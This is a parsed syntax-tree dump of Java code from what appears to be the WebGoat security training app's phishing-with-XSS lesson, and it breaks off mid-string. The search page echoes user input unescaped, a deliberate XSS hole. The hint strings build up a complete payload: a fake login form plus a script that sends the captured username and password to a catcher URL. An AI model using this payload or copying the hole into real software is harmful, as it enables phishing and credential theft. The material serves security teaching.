oc":{"start":{"line":131},"end":{"line":131}}},"loc":{"start":{"line":131},"end":{"line":131}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"t","loc":{"start":{"line":132},"end":{"line":132}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":132},"end":{"line":132}}},"arguments":[{"type":"Identifier","name":"tr","loc":{"start":{"line":132},"end":{"line":132}}}],"loc":{"start":{"line":132},"end":{"line":132}}},"loc":{"start":{"line":132},"end":{"line":132}}},{"type":"VariableDeclarator","id":{"type":"Identifier","name":"row1","vartype":{"type":"Identifier","name":"TR","loc":{"start":{"line":134},"end":{"line":134}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"TR","loc":{"start":{"line":134},"end":{"line":134}}},"init":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TR","loc":{"start":{"line":134},"end":{"line":134}}},"arguments":[],"loc":{"start":{"line":134},"end":{"line":134}}},"loc":{"start":{"line":134},"end":{"line":134}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"row1","loc":{"start":{"line":135},"end":{"line":135}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":135},"end":{"line":135}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TD","loc":{"start":{"line":135},"end":{"line":135}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"B","loc":{"start":{"line":135},"end":{"line":135}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"StringElement","loc":{"start":{"line":135},"end":{"line":135}}},"arguments":[{"type":"Literal","value":"Search: ","raw":"Search: "}],"loc":{"start":{"line":135},"end":{"line":135}}}],"loc":{"start":{"line":135},"end":{"line":135}}}],"loc":{"start":{"line":135},"end":{"line":135}}},"property":{"type":"Identifier","name":"setAlign"},"loc":{"start":{"line":135},"end":{"line":135}}},"arguments":[{"type":"Literal","value":"right","raw":"right"}],"loc":{"start":{"line":135},"end":{"line":135}}}],"loc":{"start":{"line":135},"end":{"line":135}}},"loc":{"start":{"line":135},"end":{"line":135}}},{"type":"VariableDeclarator","id":{"type":"Identifier","name":"input1","vartype":{"type":"Identifier","name":"Input","loc":{"start":{"line":137},"end":{"line":137}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"Input","loc":{"start":{"line":137},"end":{"line":137}}},"init":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"Input","loc":{"start":{"line":137},"end":{"line":137}}},"arguments":[{"type":"MemberExpression","object":{"type":"Identifier","name":"Input","loc":{"start":{"line":137},"end":{"line":137}}},"property":{"type":"Identifier","name":"TEXT"},"loc":{"start":{"line":137},"end":{"line":137}}},{"type":"Identifier","name":"SEARCH","loc":{"start":{"line":137},"end":{"line":137}}},{"type":"Identifier","name":"searchText","loc":{"start":{"line":137},"end":{"line":137}}}],"loc":{"start":{"line":137},"end":{"line":137}}},"loc":{"start":{"line":137},"end":{"line":137}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"row1","loc":{"start":{"line":138},"end":{"line":138}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":138},"end":{"line":138}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TD","loc":{"start":{"line":138},"end":{"line":138}}},"arguments":[{"type":"Identifier","name":"input1","loc":{"start":{"line":138},"end":{"line":138}}}],"loc":{"start":{"line":138},"end":{"line":138}}},"property":{"type":"Identifier","name":"setAlign"},"loc":{"start":{"line":138},"end":{"line":138}}},"arguments":[{"type":"Literal","value":"left","raw":"left"}],"loc":{"start":{"line":138},"end":{"line":138}}}],"loc":{"start":{"line":138},"end":{"line":138}}},"loc":{"start":{"line":138},"end":{"line":138}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"t","loc":{"start":{"line":139},"end":{"line":139}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":139},"end":{"line":139}}},"arguments":[{"type":"Identifier","name":"row1","loc":{"start":{"line":139},"end":{"line":139}}}],"loc":{"start":{"line":139},"end":{"line":139}}},"loc":{"start":{"line":139},"end":{"line":139}}},{"type":"VariableDeclarator","id":{"type":"Identifier","name":"b","vartype":{"type":"Identifier","name":"Element","loc":{"start":{"line":141},"end":{"line":141}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"Element","loc":{"start":{"line":141},"end":{"line":141}}},"init":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ECSFactory","loc":{"start":{"line":141},"end":{"line":141}}},"property":{"type":"Identifier","name":"makeButton"},"loc":{"start":{"line":141},"end":{"line":141}}},"arguments":[{"type":"Literal","value":"Search","raw":"Search"}],"loc":{"start":{"line":141},"end":{"line":141}}},"loc":{"start":{"line":141},"end":{"line":141}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"t","loc":{"start":{"line":142},"end":{"line":142}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":142},"end":{"line":142}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TR","loc":{"start":{"line":142},"end":{"line":142}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TD","loc":{"start":{"line":142},"end":{"line":142}}},"arguments":[{"type":"Identifier","name":"b","loc":{"start":{"line":142},"end":{"line":142}}}],"loc":{"start":{"line":142},"end":{"line":142}}},"property":{"type":"Identifier","name":"setColSpan"},"loc":{"start":{"line":142},"end":{"line":142}}},"arguments":[{"type":"Literal","value":2,"raw":2}],"loc":{"start":{"line":142},"end":{"line":142}}}],"loc":{"start":{"line":142},"end":{"line":142}}},"property":{"type":"Identifier","name":"setAlign"},"loc":{"start":{"line":142},"end":{"line":142}}},"arguments":[{"type":"Literal","value":"center","raw":"center"}],"loc":{"start":{"line":142},"end":{"line":142}}}],"loc":{"start":{"line":142},"end":{"line":142}}},"loc":{"start":{"line":142},"end":{"line":142}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":143},"end":{"line":143}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":143},"end":{"line":143}}},"arguments":[{"type":"Identifier","name":"t","loc":{"start":{"line":143},"end":{"line":143}}}],"loc":{"start":{"line":143},"end":{"line":143}}},"loc":{"start":{"line":143},"end":{"line":143}}},{"type":"IfStatement","test":{"argument":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"searchText","loc":{"start":{"line":145},"end":{"line":145}}},"property":{"type":"Identifier","name":"equals"},"loc":{"start":{"line":145},"end":{"line":145}}},"arguments":[{"type":"Literal","value":"","raw":""}],"loc":{"start":{"line":145},"end":{"line":145}}},"operator":"LOGICAL_COMPLEMENT","type":"UnaryExpression","loc":{"start":{"line":145},"end":{"line":145}}},"consequent":{"type":"BlockStatement","body":[{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":147},"end":{"line":147}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":147},"end":{"line":147}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"BR","loc":{"start":{"line":147},"end":{"line":147}}},"arguments":[],"loc":{"start":{"line":147},"end":{"line":147}}}],"loc":{"start":{"line":147},"end":{"line":147}}},"loc":{"start":{"line":147},"end":{"line":147}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":148},"end":{"line":148}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":148},"end":{"line":148}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"HR","loc":{"start":{"line":148},"end":{"line":148}}},"arguments":[],"loc":{"start":{"line":148},"end":{"line":148}}}],"loc":{"start":{"line":148},"end":{"line":148}}},"loc":{"start":{"line":148},"end":{"line":148}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":149},"end":{"line":149}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":149},"end":{"line":149}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"BR","loc":{"start":{"line":149},"end":{"line":149}}},"arguments":[],"loc":{"start":{"line":149},"end":{"line":149}}}],"loc":{"start":{"line":149},"end":{"line":149}}},"loc":{"start":{"line":149},"end":{"line":149}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":150},"end":{"line":150}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":150},"end":{"line":150}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"StringElement","loc":{"start":{"line":150},"end":{"line":150}}},"arguments":[{"type":"BinaryExpression","operator":"PLUS","left":{"type":"Literal","value":"Results for: ","raw":"Results for: "},"right":{"type":"Identifier","name":"searchText","loc":{"start":{"line":150},"end":{"line":150}}},"loc":{"start":{"line":150},"end":{"line":150}}}],"loc":{"start":{"line":150},"end":{"line":150}}}],"loc":{"start":{"line":150},"end":{"line":150}}},"loc":{"start":{"line":150},"end":{"line":150}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":151},"end":{"line":151}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":151},"end":{"line":151}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"Comment","loc":{"start":{"line":151},"end":{"line":151}}},"arguments":[{"type":"Literal","value":"Search results","raw":"Search results"}],"loc":{"start":{"line":151},"end":{"line":151}}}],"loc":{"start":{"line":151},"end":{"line":151}}},"loc":{"start":{"line":151},"end":{"line":151}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":152},"end":{"line":152}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":152},"end":{"line":152}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"BR","loc":{"start":{"line":152},"end":{"line":152}}},"arguments":[],"loc":{"start":{"line":152},"end":{"line":152}}}],"loc":{"start":{"line":152},"end":{"line":152}}},"loc":{"start":{"line":152},"end":{"line":152}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":153},"end":{"line":153}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":153},"end":{"line":153}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"BR","loc":{"start":{"line":153},"end":{"line":153}}},"arguments":[],"loc":{"start":{"line":153},"end":{"line":153}}}],"loc":{"start":{"line":153},"end":{"line":153}}},"loc":{"start":{"line":153},"end":{"line":153}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":154},"end":{"line":154}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":154},"end":{"line":154}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"B","loc":{"start":{"line":154},"end":{"line":154}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"StringElement","loc":{"start":{"line":154},"end":{"line":154}}},"arguments":[{"type":"Literal","value":"No results were found.","raw":"No results were found."}],"loc":{"start":{"line":154},"end":{"line":154}}}],"loc":{"start":{"line":154},"end":{"line":154}}}],"loc":{"start":{"line":154},"end":{"line":154}}},"loc":{"start":{"line":154},"end":{"line":154}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":155},"end":{"line":155}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":155},"end":{"line":155}}},"arguments":[{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"Comment","loc":{"start":{"line":155},"end":{"line":155}}},"arguments":[{"type":"Literal","value":"End of Search results","raw":"End of Search results"}],"loc":{"start":{"line":155},"end":{"line":155}}}],"loc":{"start":{"line":155},"end":{"line":155}}},"loc":{"start":{"line":155},"end":{"line":155}}}],"loc":{"start":{"line":146},"end":{"line":156}}},"loc":{"start":{"line":145},"end":{"line":156}}},{"type":"ReturnStatement","argument":{"type":"Identifier","name":"ec","loc":{"start":{"line":158},"end":{"line":158}}},"loc":{"start":{"line":158},"end":{"line":158}}}],"loc":{"start":{"line":111},"end":{"line":159}}},"code":"\nprotected Element makeSearch(WebSession s) {\n    ElementContainer ec \u003d new ElementContainer();\n    ec.addElement(new H1().addElement(\"WebGoat Search \"));\n    Table t \u003d new Table().setCellSpacing(0).setCellPadding(2).setBorder(0).setAlign(\"center\");\n    TR tr \u003d new TR();\n    tr.addElement(new TD().addElement(\"\u0026nbsp;\").setColSpan(2));\n    t.addElement(tr);\n    if (s.isColor()) {\n        t.setBorder(1);\n    }\n    tr \u003d new TR();\n    tr.addElement(new TH().addElement(\"This facility will search the WebGoat source.\").setColSpan(2).setAlign(\"center\"));\n    t.addElement(tr);\n    tr \u003d new TR();\n    tr.addElement(new TD().addElement(\"\u0026nbsp;\").setColSpan(2));\n    t.addElement(tr);\n    TR row1 \u003d new TR();\n    row1.addElement(new TD(new B(new StringElement(\"Search: \"))).setAlign(\"right\"));\n    Input input1 \u003d new Input(Input.TEXT, SEARCH, searchText);\n    row1.addElement(new TD(input1).setAlign(\"left\"));\n    t.addElement(row1);\n    Element b \u003d ECSFactory.makeButton(\"Search\");\n    t.addElement(new TR(new TD(b).setColSpan(2)).setAlign(\"center\"));\n    ec.addElement(t);\n    if (!searchText.equals(\"\")) {\n        ec.addElement(new BR());\n        ec.addElement(new HR());\n        ec.addElement(new BR());\n        ec.addElement(new StringElement(\"Results for: \" + searchText));\n        ec.addElement(new Comment(\"Search results\"));\n        ec.addElement(new BR());\n        ec.addElement(new BR());\n        ec.addElement(new B(new StringElement(\"No results were found.\")));\n        ec.addElement(new Comment(\"End of Search results\"));\n    }\n    return (ec);\n}","loc":{"start":{"line":110},"end":{"line":159}}},{"type":"FunctionDeclaration","id":{"type":"Identifier","name":"getHints"},"modifiers":{"type":"Modifiers","modifiers":["protected"],"annotations":[]},"restype":{"type":"Identifier","name":"List","loc":{"start":{"line":166},"end":{"line":166}}},"typarams":[],"params":[{"type":"Identifier","name":"s","vartype":{"type":"Identifier","name":"WebSession","loc":{"start":{"line":166},"end":{"line":166}}}}],"thrown":[],"body":{"type":"BlockStatement","body":[{"type":"VariableDeclarator","id":{"type":"Identifier","name":"hints","vartype":{"type":"Identifier","name":"List","loc":{"start":{"line":168},"end":{"line":168}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"List","loc":{"start":{"line":168},"end":{"line":168}}},"init":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"ArrayList","loc":{"start":{"line":168},"end":{"line":168}}},"arguments":[],"loc":{"start":{"line":168},"end":{"line":168}}},"loc":{"start":{"line":168},"end":{"line":168}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"hints","loc":{"start":{"line":169},"end":{"line":169}}},"property":{"type":"Identifier","name":"add"},"loc":{"start":{"line":169},"end":{"line":169}}},"arguments":[{"type":"Literal","value":"Try adding HTML to the search field to create a fake authentication form.\u003cBR\u003eTry to make the form look official.","raw":"Try adding HTML to the search field to create a fake authentication form.\u003cBR\u003eTry to make the form look official."}],"loc":{"start":{"line":169},"end":{"line":170}}},"loc":{"start":{"line":169},"end":{"line":170}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"hints","loc":{"start":{"line":171},"end":{"line":171}}},"property":{"type":"Identifier","name":"add"},"loc":{"start":{"line":171},"end":{"line":172}}},"arguments":[{"type":"Literal","value":"Try: \u003cBR\u003e \u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;","raw":"Try: \u003cBR\u003e \u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;"}],"loc":{"start":{"line":171},"end":{"line":176}}},"loc":{"start":{"line":171},"end":{"line":176}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"hints","loc":{"start":{"line":177},"end":{"line":177}}},"property":{"type":"Identifier","name":"add"},"loc":{"start":{"line":177},"end":{"line":178}}},"arguments":[{"type":"Literal","value":"Add functionality that can post a request, a button might work\u003cBR\u003e\u003cBR\u003eAfter getting the button on the page, don\u0027t forget you will need to steal the credentials and post them to: \u003cBR\u003ehttp://localhost/webgoat/capture/PROPERTY\u003dyes\u0026ADD_CREDENTIALS_HERE","raw":"Add functionality that can post a request, a button might work\u003cBR\u003e\u003cBR\u003eAfter getting the button on the page, don\u0027t forget you will need to steal the credentials and post them to: \u003cBR\u003ehttp://localhost/webgoat/capture/PROPERTY\u003dyes\u0026ADD_CREDENTIALS_HERE"}],"loc":{"start":{"line":177},"end":{"line":180}}},"loc":{"start":{"line":177},"end":{"line":180}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"hints","loc":{"start":{"line":181},"end":{"line":181}}},"property":{"type":"Identifier","name":"add"},"loc":{"start":{"line":181},"end":{"line":182}}},"arguments":[{"type":"Literal","value":"Try: \u003cBR\u003e \u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot;\u0026gt;\u003cBR\u003e\u003cBR\u003eIn the whole script:\u003cBR\u003e\u003cBR\u003e\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;","raw":"Try: \u003cBR\u003e \u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot;\u0026gt;\u003cBR\u003e\u003cBR\u003eIn the whole script:\u003cBR\u003e\u003cBR\u003e\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;"}],"loc":{"start":{"line":181},"end":{"line":190}}},"loc":{"start":{"line":181},"end":{"line":190}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"hints","loc":{"start":{"line":191},"end":{"line":191}}},"property":{"type":"Identifier","name":"add"},"loc":{"start":{"line":191},"end":{"line":192}}},"arguments":[{"type":"Literal","value":"Make the button perform an action on submit, \u003cBR\u003eadding an onclick\u003d\"hack()\" might work\u003cBR\u003eDon\u0027t forget to add the hack() javascript function\u003cBR\u003e\u003cBR\u003eIn the whole script:\u003cBR\u003e\u003cBR\u003e\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u003cBR\u003eAlso, check firebug. Does the search form need to be terminated for this to work...? (\u0026lt;/form\u0026gt;)","raw":"Make the button perform an action on submit, \u003cBR\u003eadding an onclick\u003d\"hack()\" might work\u003cBR\u003eDon\u0027t forget to add the hack() javascript function\u003cBR\u003e\u003cBR\u003eIn the whole script:\u003cBR\u003e\u003cBR\u003e\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u003cBR\u003eAlso, check firebug. Does the search form need to be terminated for this to work...? (\u0026lt;/form\u0026gt;)"}],"loc":{"start":{"line":191},"end":{"line":201}}},"loc":{"start":{"line":191},"end":{"line":201}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"hints","loc":{"start":{"line":202},"end":{"line":202}}},"property":{"type":"Identifier","name":"add"},"loc":{"start":{"line":202},"end":{"line":203}}},"arguments":[{"type":"Literal","value":"You need to create the hack() function.  This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet. \u003cBR\u003e\u003cBR\u003e Some useful code snippets:\u003cUL\u003e\u003cLI\u003edoucument.phish.user.value - will access the user field\u003cLI\u003eXssImage \u003d new Image(); XssImage.src\u003dSOME_URL \u003d will perform a post\u003cLI\u003ejavascript string concatentation uses a \"+\" \u003c/UL\u003e\u003cBR\u003e\u003cBR\u003eThe entire javascript portion:\u003cBR\u003e\u003cBR\u003e\u0026lt;script\u0026gt;function hack(){ XSSImage\u003dnew Image; XSSImage.src\u003d\u0026quot;http://localhost/webgoat/catcher?PROPERTY\u003dyes\u0026amp;user\u003d\u0026quot;+document.phish.user.value + \u0026quot;\u0026amp;password\u003d\u0026quot; + document.phish.pass.value + \u0026quot;\u0026quot;;alert(\u0026quot;Had this been a real attack... Your credentials were just stolen.\nUser Name \u003d \u0026quot; + document.phish.user.value + \u0026quot;\nPassword \u003d \u0026quot; +  document.phish.pass.value);} \u0026lt;/script\u0026gt;","raw":"You need to create the hack() function.  This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet. \u003cBR\u003e\u003cBR\u003e Some useful code snippets:\u003cUL\u003e\u003cLI\u003edoucument.phish.user.value - will access the user field\u003cLI\u003eXssImage \u003d new Image(); XssImage.src\u003dSOME_URL \u003d will perform a post\u003cLI\u003ejavascript string concatentation uses a \"+\" \u003c/UL\u003e\u003cBR\u003e\u003cBR\u003eThe entire javascript portion:\u003cBR\u003e\u003cBR\u003e\u0026lt;script\u0026gt;function hack(){ XSSImage\u003dnew Image; XSSImage.src\u003d\u0026quot;http://localhost/webgoat/catcher?PROPERTY\u003dyes\u0026amp;user\u003d\u0026quot;+document.phish.user.value + \u0026quot;\u0026amp;password\u003d\u0026quot; + document.phish.pass.value + \u0026quot;\u0026quot;;alert(\u0026quot;Had this been a real attack... Your credentials were just stolen.\nUser Name \u003d \u0026quot; + document.phish.user.value + \u0026quot;\nPassword \u003d \u0026quot; +  document.phish.pass.value);} \u0026lt;/script\u0026gt;"}],"loc":{"start":{"line":202},"end":{"line":215}}},"loc":{"start":{"line":202},"end":{"line":215}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"hints","loc":{"start":{"line":216},"end":{"line":216}}},"property":{"type":"Identifier","name":"add"},"loc":{"start":{"line":216},"end":{"line":217}}},"arguments":[{"type":"Literal","value":"Complete solution for this lesson:\u003cBR\u003e\u003cBR\u003e\u0026lt;/form\u0026gt;\u0026lt;script\u0026gt;function hack(){ XSSImage\u003dnew Image; XSSImage.src\u003d\u0026quot;http://localhost/webgoat/catcher?PROPERTY\u003dyes\u0026amp;user\u003d\u0026quot;+document.phish.user.value + \u0026quot;\u0026amp;password\u003d\u0026quot; + document.phish.pass.value + \u0026quot;\u0026quot;;alert(\u0026quot;Had this been a real attack... Your credentials were just stolen.\nUser Name \u003d \u0026quot; + document.phish.user.value + \u0026quot;\nPassword \u003d \u0026quot; +  document.phish.pass.value);} \u0026lt;/script\u0026gt;\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter 